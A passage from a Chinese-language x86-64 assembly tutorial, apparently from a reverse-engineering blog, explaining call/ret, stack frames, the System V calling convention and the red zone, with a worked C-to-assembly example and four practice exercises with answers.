+</span></span></code></pre></div><p>逆向时，循环不一定保留 <code>for</code> 或 <code>while</code> 的外观。我们通常通过“向前的条件跳转 + 跳回较低地址的跳转”识别循环结构，再分析初始化、循环条件和变量更新。</p><h3 id=4-call-与-ret>4. <code>call</code> 与 <code>ret</code></h3><p><code>call target</code> 主要完成两件事：</p><ol><li>把 <code>call</code> 后面那条指令的地址压入栈中，作为返回地址。</li><li>把控制流转移到 <code>target</code>。</li></ol><p><code>ret</code> 则从栈顶取出返回地址，并跳回该地址。可以近似理解为：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>call target：push 下一条指令地址；跳转到 target
+</span></span><span style=display:flex><span>ret：        pop RIP
+</span></span></code></pre></div><p>这就是函数执行结束后能够回到调用位置的基本原因。如果栈上的返回地址被错误覆盖，<code>ret</code> 就可能跳到错误的位置；经典的栈缓冲区溢出利用正是由此展开。</p><h2 id=栈与栈帧>栈与栈帧</h2><h3 id=1-栈是什么>1. 栈是什么</h3><p>栈是进程内存中的一片区域，按照“后进先出”的方式使用。x86-64 用户态程序的栈通常向低地址增长：压入数据时 <code>RSP</code> 变小，弹出数据时 <code>RSP</code> 变大。</p><p>假设 <code>RSP</code> 最初为 <code>0x1000</code>，<code>RAX</code> 为 <code>0x1122334455667788</code>：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>push</span> <span style=color:#79c0ff;font-weight:700>rax</span>
+</span></span></code></pre></div><p>执行后：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>高地址
+</span></span><span style=display:flex><span>0x1000  ← 压栈前的 RSP
+</span></span><span style=display:flex><span>0x0ff8  0x1122334455667788  ← 压栈后的 RSP
+</span></span><span style=display:flex><span>低地址
+</span></span></code></pre></div><p>随后执行 <code>pop rbx</code>，<code>RBX</code> 得到该值，<code>RSP</code> 恢复为 <code>0x1000</code>。</p><p>栈常用于保存：</p><ul><li>函数返回地址；</li><li>无法全部放入寄存器的参数；</li><li>局部变量和临时数据；</li><li>需要跨函数调用保持的寄存器值；</li><li>对齐所需的填充空间。</li></ul><h3 id=2-一个典型栈帧>2. 一个典型栈帧</h3><p>在未优化或保留帧指针的代码中，函数开头常见：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>push</span> <span style=color:#79c0ff;font-weight:700>rbp</span>
+</span></span><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>rbp</span>, <span style=color:#79c0ff;font-weight:700>rsp</span>
+</span></span><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>sub</span> <span style=color:#79c0ff;font-weight:700>rsp</span>, <span style=color:#a5d6ff>32</span>
+</span></span></code></pre></div><p>含义依次是：保存调用者的 <code>RBP</code>，让当前 <code>RBP</code> 指向本函数栈帧的固定基准，再为局部变量预留 32 字节空间。此时可通过 <code>[rbp-4]</code>、<code>[rbp-8]</code> 等地址访问局部数据。</p><p>函数结束时可能使用：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>rsp</span>, <span style=color:#79c0ff;font-weight:700>rbp</span>
+</span></span><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>pop</span> <span style=color:#79c0ff;font-weight:700>rbp</span>
+</span></span><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>ret</span>
+</span></span></code></pre></div><p>也可能用一条 <code>leave</code> 代替前两条。一个简化的栈帧布局如下：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>高地址
+</span></span><span style=display:flex><span>+-------------------------+
+</span></span><span style=display:flex><span>| 栈上传递的额外参数       |
+</span></span><span style=display:flex><span>+-------------------------+
+</span></span><span style=display:flex><span>| 返回地址                 |  由 call 压入
+</span></span><span style=display:flex><span>+-------------------------+
+</span></span><span style=display:flex><span>| 调用者原来的 RBP         |  ← RBP
+</span></span><span style=display:flex><span>+-------------------------+
+</span></span><span style=display:flex><span>| 局部变量、临时数据        |
+</span></span><span style=display:flex><span>| 保存的寄存器、填充空间    |  ← RSP
+</span></span><span style=display:flex><span>+-------------------------+
+</span></span><span style=display:flex><span>低地址
+</span></span></code></pre></div><p>这只是常见形式，并不是每个函数都必须如此。优化后的编译器可以省略 <code>RBP</code> 栈帧，直接相对 <code>RSP</code> 访问数据；若所有局部变量都能放入寄存器，函数甚至无需分配栈空间。逆向时不要依赖固定模板，而要追踪 <code>RSP</code> 的实际变化。</p><h3 id=3-调用过程中栈如何变化>3. 调用过程中栈如何变化</h3><p>假设调用者即将执行：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>call</span> <span style=color:#79c0ff;font-weight:700>worker</span>
+</span></span></code></pre></div><p>若调用前 <code>RSP = 0x1000</code>，则 <code>call</code> 会把返回地址压入栈，进入 <code>worker</code> 时 <code>RSP = 0x0ff8</code>。若 <code>worker</code> 随后执行 <code>push rbp</code>，<code>RSP</code> 变为 <code>0x0ff0</code>。函数结束时：</p><ol><li><code>pop rbp</code> 使 <code>RSP</code> 从 <code>0x0ff0</code> 回到 <code>0x0ff8</code>；</li><li><code>ret</code> 取出返回地址，使 <code>RSP</code> 回到 <code>0x1000</code>；</li><li>CPU 从 <code>call</code> 后面的指令继续执行。</li></ol><p>只要压入和弹出的数据不匹配，返回地址就可能被当成普通数据弹走，或者 <code>ret</code> 取到错误地址。因此，分析函数时应特别关注每一处对 <code>RSP</code> 的修改。</p><h2 id=linux-x86-64-函数调用约定>Linux x86-64 函数调用约定</h2><p>如果每个函数都随意选择寄存器传参，分别编译的代码将无法可靠协作。调用约定规定了参数放在哪里、返回值放在哪里、哪些寄存器需要保持，以及栈应如何对齐。</p><p>本文讨论 Linux 等类 Unix 系统常用的 System V AMD64 ABI。这里只介绍普通整数和指针参数；浮点参数、结构体返回和可变参数还有额外规则。</p><h3 id=1-参数与返回值>1. 参数与返回值</h3><p>前六个整数或指针参数依次使用：</p><table><thead><tr><th>参数序号</th><th>64 位寄存器</th><th>传递 <code>int</code> 时常见部分</th></tr></thead><tbody><tr><td>第 1 个</td><td><code>RDI</code></td><td><code>EDI</code></td></tr><tr><td>第 2 个</td><td><code>RSI</code></td><td><code>ESI</code></td></tr><tr><td>第 3 个</td><td><code>RDX</code></td><td><code>EDX</code></td></tr><tr><td>第 4 个</td><td><code>RCX</code></td><td><code>ECX</code></td></tr><tr><td>第 5 个</td><td><code>R8</code></td><td><code>R8D</code></td></tr><tr><td>第 6 个</td><td><code>R9</code></td><td><code>R9D</code></td></tr></tbody></table><p>更多整数参数通过栈传递。整数或指针返回值通常位于 <code>RAX</code>；返回 <code>int</code> 时常看到写入 <code>EAX</code>。</p><p>例如：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff7b72>long</span> <span style=color:#d2a8ff;font-weight:700>add_three</span>(<span style=color:#ff7b72>long</span> a, <span style=color:#ff7b72>long</span> b, <span style=color:#ff7b72>long</span> c) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> a <span style=color:#ff7b72;font-weight:700>+</span> b <span style=color:#ff7b72;font-weight:700>+</span> c;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>可以写成：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#79c0ff;font-weight:700>add_three:</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>lea</span> <span style=color:#79c0ff;font-weight:700>rax</span>, [<span style=color:#79c0ff;font-weight:700>rdi</span> <span style=color:#f85149>+</span> <span style=color:#79c0ff;font-weight:700>rsi</span>]
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>add</span> <span style=color:#79c0ff;font-weight:700>rax</span>, <span style=color:#79c0ff;font-weight:700>rdx</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>ret</span>
+</span></span></code></pre></div><h3 id=2-调用者保存与被调用者保存>2. 调用者保存与被调用者保存</h3><p>函数调用可能覆盖一部分寄存器。为了让调用双方能够配合，ABI 把通用寄存器大致分为两类：</p><table><thead><tr><th>类型</th><th>寄存器</th><th>规则</th></tr></thead><tbody><tr><td>调用者保存</td><td><code>RAX</code>、<code>RCX</code>、<code>RDX</code>、<code>RSI</code>、<code>RDI</code>、<code>R8</code>～<code>R11</code></td><td>调用者若想在 <code>call</code> 后继续使用旧值，应在调用前自行保存</td></tr><tr><td>被调用者保存</td><td><code>RBX</code>、<code>RBP</code>、<code>R12</code>～<code>R15</code></td><td>被调用者若要修改，必须先保存，并在返回前恢复</td></tr></tbody></table><p><code>RSP</code> 也必须在函数返回时恢复到调用约定要求的位置，否则调用者无法正确继续执行。</p><p>“保存”不代表每次都要把所有相关寄存器压栈。函数只需处理自己真正修改且必须保持的寄存器。编译器也可能选择把跨调用仍需使用的值放进 <code>RBX</code> 等被调用者保存寄存器，或暂存在栈上。</p><h3 id=3-栈对齐>3. 栈对齐</h3><p>System V AMD64 ABI 要求函数调用边界满足 16 字节对齐。便于初学者记忆的方式是：</p><ul><li>调用者执行 <code>call</code> 前，通常让 <code>RSP</code> 是 16 的倍数；</li><li><code>call</code> 压入 8 字节返回地址，因此被调用函数刚进入时通常有 <code>RSP % 16 == 8</code>；</li><li>被调用函数若还要调用其他函数，需要在下一次 <code>call</code> 前重新调整好对齐。</li></ul><p>这也是代码中有时会出现看似“多余”的 <code>sub rsp, 8</code> 或更大填充空间的原因。某些 SIMD 指令和库函数依赖正确对齐，破坏约定可能造成崩溃。</p><h3 id=4-red-zone>4. Red zone</h3><p>System V AMD64 ABI 在当前 <code>RSP</code> 下方保留了 128 字节的 <strong>red zone（红区）</strong>。用户态的信号或中断处理过程不会破坏这一区域，因此不再调用其他函数的叶子函数可以把临时数据放在这里，而无需先执行 <code>sub rsp, ...</code>。</p><p>但是，普通的函数调用会让被调用函数使用更低地址的栈空间，所以需要跨越 <code>call</code> 保存的数据不能依赖红区。内核代码通常也不会使用这一规则。初学阶段只需做到：看到叶子函数直接访问 <code>[rsp-8]</code> 时，不要立刻认为它越过了栈顶或写错了内存。</p><h2 id=综合示例从-c-函数到汇编>综合示例：从 C 函数到汇编</h2><p>假设有如下代码：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff7b72>int</span> <span style=color:#d2a8ff;font-weight:700>helper</span>(<span style=color:#ff7b72>int</span> x);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>int</span> <span style=color:#d2a8ff;font-weight:700>adjust</span>(<span style=color:#ff7b72>int</span> value, <span style=color:#ff7b72>int</span> limit) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>int</span> doubled <span style=color:#ff7b72;font-weight:700>=</span> value <span style=color:#ff7b72;font-weight:700>*</span> <span style=color:#a5d6ff>2</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (doubled <span style=color:#ff7b72;font-weight:700>&gt;</span> limit) {
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>return</span> doubled <span style=color:#ff7b72;font-weight:700>-</span> limit;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> <span style=color:#d2a8ff;font-weight:700>helper</span>(doubled);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>下面是一份符合前述规则、为教学简化过的汇编实现：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#79c0ff;font-weight:700>adjust:</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>push</span> <span style=color:#79c0ff;font-weight:700>rbp</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>rbp</span>, <span style=color:#79c0ff;font-weight:700>rsp</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>push</span> <span style=color:#79c0ff;font-weight:700>rbx</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>sub</span> <span style=color:#79c0ff;font-weight:700>rsp</span>, <span style=color:#a5d6ff>8</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>lea</span> <span style=color:#79c0ff;font-weight:700>ebx</span>, [<span style=color:#79c0ff;font-weight:700>rdi</span> <span style=color:#f85149>+</span> <span style=color:#79c0ff;font-weight:700>rdi</span>]  <span style=color:#8b949e;font-style:italic>; EBX = value * 2
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>    <span style=color:#d2a8ff;font-weight:700>cmp</span> <span style=color:#79c0ff;font-weight:700>ebx</span>, <span style=color:#79c0ff;font-weight:700>esi</span>          <span style=color:#8b949e;font-style:italic>; doubled 与 limit 比较
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>    <span style=color:#d2a8ff;font-weight:700>jle</span> <span style=color:#79c0ff;font-weight:700>.call_helper</span>      <span style=color:#8b949e;font-style:italic>; doubled &lt;= limit 时调用 helper
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#79c0ff;font-weight:700>ebx</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>sub</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#79c0ff;font-weight:700>esi</span>          <span style=color:#8b949e;font-style:italic>; 返回 doubled - limit
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>    <span style=color:#d2a8ff;font-weight:700>jmp</span> <span style=color:#79c0ff;font-weight:700>.done</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#79c0ff;font-weight:700>.call_helper:</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>edi</span>, <span style=color:#79c0ff;font-weight:700>ebx</span>          <span style=color:#8b949e;font-style:italic>; helper 的第一个参数
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>    <span style=color:#d2a8ff;font-weight:700>call</span> <span style=color:#79c0ff;font-weight:700>helper</span>           <span style=color:#8b949e;font-style:italic>; 返回值已经位于 EAX
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#79c0ff;font-weight:700>.done:</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>add</span> <span style=color:#79c0ff;font-weight:700>rsp</span>, <span style=color:#a5d6ff>8</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>pop</span> <span style=color:#79c0ff;font-weight:700>rbx</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>pop</span> <span style=color:#79c0ff;font-weight:700>rbp</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>ret</span>
+</span></span></code></pre></div><p>逐步分析：</p><ol><li><code>value</code> 和 <code>limit</code> 是前两个 <code>int</code> 参数，分别位于 <code>EDI</code>、<code>ESI</code>。</li><li><code>lea ebx, [rdi+rdi]</code> 算出两倍的 <code>value</code>。写入 <code>EBX</code> 也会清除 <code>RBX</code> 的高 32 位。</li><li><code>doubled</code> 在调用 <code>helper</code> 时仍要使用。这里把它放入被调用者保存寄存器 <code>RBX</code>，所以函数开头保存旧 <code>RBX</code>，返回前再恢复。</li><li><code>cmp ebx, esi</code> 按照 <code>doubled-limit</code> 更新标志；源代码使用有符号 <code>int</code>，所以用 <code>jle</code>。</li><li>大于分支在 <code>EAX</code> 中计算返回值；小于等于分支把参数放入 <code>EDI</code> 后调用 <code>helper</code>。</li><li><code>helper</code> 的返回值已经在 <code>EAX</code>，因此无需再次搬运。</li><li>进入 <code>adjust</code> 时，返回地址已经占 8 字节；<code>push rbp</code>、<code>push rbx</code> 和 <code>sub rsp,8</code> 共同让 <code>RSP</code> 在调用 <code>helper</code> 前满足 16 字节对齐。</li><li>两条返回路径最终都到达 <code>.done</code>，按相反顺序撤销栈空间并恢复寄存器。</li></ol><p>真实编译器可能使用条件移动、重新排列分支、内联 <code>helper</code>，或采取完全不同的寄存器分配。逆向分析的目标不是背下一种固定模板，而是根据数据流和控制流还原等价逻辑。</p><h2 id=简单练习题>简单练习题</h2><h3 id=练习-1追踪子寄存器>练习 1：追踪子寄存器</h3><p>执行下面的代码后，<code>RAX</code> 是多少？</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>rax</span>, <span style=color:#a5d6ff>0xffffffffffffffff</span>
+</span></span><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#a5d6ff>0xffffffff</span>
+</span></span><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>add</span> <span style=color:#79c0ff;font-weight:700>rax</span>, <span style=color:#a5d6ff>1</span>
+</span></span></code></pre></div><details><summary>查看答案</summary><p><code>mov eax, 0xffffffff</code> 会清除 <code>RAX</code> 的高 32 位，因此此时 <code>RAX = 0x00000000ffffffff</code>。再加 1 后：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>RAX = 0x0000000100000000
+</span></span></code></pre></div></details><h3 id=练习-2判断跳转>练习 2：判断跳转</h3><p>若 <code>EAX = 5</code>、<code>EBX = 8</code>，下面的 <code>jl</code> 是否跳转？</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>cmp</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#79c0ff;font-weight:700>ebx</span>
+</span></span><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>jl</span> <span style=color:#79c0ff;font-weight:700>.smaller</span>
+</span></span></code></pre></div><details><summary>查看答案</summary><p>会跳转。<code>cmp eax, ebx</code> 按照 <code>5-8</code> 设置标志，<code>jl</code> 按有符号数判断 <code>EAX &lt; EBX</code>，条件成立。</p></details><h3 id=练习-3追踪栈指针>练习 3：追踪栈指针</h3><p>假设开始时 <code>RSP = 0x1000</code>，依次执行：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>push</span> <span style=color:#79c0ff;font-weight:700>rax</span>
+</span></span><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>call</span> <span style=color:#79c0ff;font-weight:700>target</span>
+</span></span></code></pre></div><p>进入 <code>target</code> 时 <code>RSP</code> 是多少？若 <code>target</code> 立即执行 <code>ret</code>，随后调用者执行 <code>pop rax</code>，最终 <code>RSP</code> 又是多少？</p><details><summary>查看答案</summary><p><code>push rax</code> 压入 8 字节，<code>RSP</code> 变为 <code>0x0ff8</code>；<code>call</code> 再压入 8 字节返回地址，进入 <code>target</code> 时 <code>RSP = 0x0ff0</code>。</p><p><code>ret</code> 弹出返回地址后，<code>RSP</code> 回到 <code>0x0ff8</code>；<code>pop rax</code> 再弹出先前保存的值，最终 <code>RSP = 0x1000</code>。</p></details><h3 id=练习-4还原伪代码>练习 4：还原伪代码</h3><p>尝试把下面的汇编还原成 C 风格伪代码：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#79c0ff;font-weight:700>calc:</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>xor</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#79c0ff;font-weight:700>eax</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>xor</span> <span style=color:#79c0ff;font-weight:700>ecx</span>, <span style=color:#79c0ff;font-weight:700>ecx</span>
+</span></span><span style=display:flex><span><span style=color:#79c0ff;font-weight:700>.loop:</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>cmp</span> <span style=color:#79c0ff;font-weight:700>ecx</span>, <span style=color:#79c0ff;font-weight:700>edi</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>jge</span> <span style=color:#79c0ff;font-weight:700>.done</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>add</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#79c0ff;font-weight:700>ecx</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>add</span> <span style=color:#79c0ff;font-weight:700>ecx</span>, <span style=color:#a5d6ff>1</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>jmp</span> <span style=color:#79c0ff;font-weight:700>.loop</span>
+</span></span><span style=display:flex><span><span style=color:#79c0ff;font-weight:700>.done:</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>ret</span>
+</span></span></code></pre></div><details><summary>查看答案</summary><p><code>EDI</code> 是参数，<code>EAX</code> 是累加结果，<code>ECX</code> 是从 0 开始的循环变量。等价逻辑可以写成：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff7b72>int</span> <span style=color:#d2a8ff;font-weight:700>calc</span>(<span style=color:#ff7b72>int</span> n) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>int</span> result <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>;
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> i <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; i <span style=color:#ff7b72;font-weight:700>&lt;</span> n; i<span style=color:#ff7b72;font-weight:700>++</span>) {
+</span></span><span style=display:flex><span>        result <span style=color:#ff7b72;font-weight:700>+=</span> i;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> result;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>当 <code>n &lt;= 0</code> 时，第一次比较就满足 <code>i >= n</code>，函数返回 0。</p></details></div></article><aside class="article-toc article-toc-desktop" data-article-toc aria-label="Table of contents"><p class=toc-title>On this page</p><nav class=table-of-contents><ul><li><a href=#计算机由哪些主要硬件组成>计算机由哪些主要硬件组成</a><ul><li><a href=#1-cpu-内部有什么>1. CPU 内部有什么</a></li><li><a href=#2-取指译码与执行>2. 取指、译码与执行</a></li><li><a href=#3-为什么需要不同层次的存储>3. 为什么需要不同层次的存储</a></li></ul></li><li><a href=#x86-64-寄存器>x86-64 寄存器</a><ul><li><a href=#1-通用寄存器>1. 通用寄存器</a></li><li><a href=#2-特殊寄存器>2. 特殊寄存器</a></li><li><a href=#3-子寄存器>3. 子寄存器</a></li></ul></li><li><a href=#汇编语言的基本写法>汇编语言的基本写法</a><ul><li><a href=#1-指令和操作数>1. 指令和操作数</a></li><li><a href=#2-内存寻址>2. 内存寻址</a></li><li><a href=#3-数据宽度与小端序>3. 数据宽度与小端序</a></li></ul></li><li><a href=#常见的数据传输指令>常见的数据传输指令</a><ul><li><a href=#1-mov复制数据>1. <code>mov</code>：复制数据</a></li><li><a href=#2-movzx-与-movsx扩展较小的数据>2. <code>movzx</code> 与 <code>movsx</code>：扩展较小的数据</a></li><li><a href=#3-lea计算有效地址>3. <code>lea</code>：计算有效地址</a></li><li><a href=#4-push-与-pop在栈上保存和取回数据>4. <code>push</code> 与 <code>pop</code>：在栈上保存和取回数据</a></li></ul></li><li><a href=#运算比较与标志位>运算、比较与标志位</a><ul><li><a href=#1-基本运算>1. 基本运算</a></li><li><a href=#2-常见状态标志>2. 常见状态标志</a></li><li><a href=#3-cmp比较两个值>3. <code>cmp</code>：比较两个值</a></li><li><a href=#4-test按位测试>4. <code>test</code>：按位测试</a></li></ul></li><li><a href=#控制流指令>控制流指令</a><ul><li><a href=#1-jmp无条件跳转>1. <code>jmp</code>：无条件跳转</a></li><li><a href=#2-条件跳转与-ifelse>2. 条件跳转与 <code>if/else</code></a></li><li><a href=#3-条件跳转与循环>3. 条件跳转与循环</a></li><li><a href=#4-call-与-ret>4. <code>call</code> 与 <code>ret</code></a></li></ul></li><li><a href=#栈与栈帧>栈与栈帧</a><ul><li><a href=#1-栈是什么>1. 栈是什么</a></li><li><a href=#2-一个典型栈帧>2. 一个典型栈帧</a></li><li><a href=#3-调用过程中栈如何变化>3. 调用过程中栈如何变化</a></li></ul></li><li><a href=#linux-x86-64-函数调用约定>Linux x86-64 函数调用约定</a><ul><li><a href=#1-参数与返回值>1. 参数与返回值</a></li><li><a href=#2-调用者保存与被调用者保存>2. 调用者保存与被调用者保存</a></li><li><a href=#3-栈对齐>3. 栈对齐</a></li><li><a href=#4-red-zone>4. Red zone</a></li></ul></li><li><a href=#综合示例从-c-函数到汇编>综合示例：从 C 函数到汇编</a></li><li><a href=#简单练习题>简单练习题</a><ul><li><a href=#练习-1追踪子寄存器>练习 1：追踪子寄存器</a></li><li><a href=#练习-2判断跳转>练习 2：判断跳转</a></li><li><a href=#练习-3追踪栈指针>练习 3：追踪栈指针</a></li><li><a href=#练习-4还原伪代码>练习 4：还原伪代码</a></li></ul></li></ul></nav></aside></div></div><section class=terminal aria-label=Terminal><div class=panel-header><p class=panel-title>Terminal</p><button class=panel-collapse type=button data-view-toggle=terminal aria-label="Collapse Terminal" title="Collapse Terminal">⌄</button></div><div class=terminal-body data-terminal-output aria-live=polite><p class=terminal-output>C0nvR3 Lab terminal ready. Type <span>help</span> for commands.</p></div><form class=terminal-form data-terminal><label for=terminal-command><span class=prompt data-terminal-user>C0nvR3@lab</span>:<span class=directory data-terminal-path>~/workspace</span><span data-terminal-symbol>$</span></label>
+<input id=terminal-command name=command type=text autocomplete=off autocapitalize=off spellcheck=false aria-label="Terminal command"></form><template id=terminal-filesystem><i data-terminal-entry data-kind=directory data-path=/home/C0nvR3/workspace/posts></i>
+<i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/posts/wsl2_env data-url=/posts/wsl2-setup/></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/posts/wsl2_env/image-1.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/posts/wsl2_env/image-2.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/posts/wsl2_env/image-3.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/posts/wsl2_env/image-4.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/posts/wsl2_env/image.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/posts/wsl2_env/dr.md></i>
+<i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/posts/acient_neural_network data-url=/posts/neural-network-from-scratch/></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/posts/acient_neural_network/image.png></i>
+<i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/posts/ret2dlresolve data-url=/posts/ret2dlresolve/></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/posts/ret2dlresolve/lazy-plt.png></i>
+<i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/posts/Pivoting data-url=/posts/stack-pivoting/></i>
+<i data-terminal-entry data-kind=directory data-path=/home/C0nvR3/workspace/How2pwn></i>
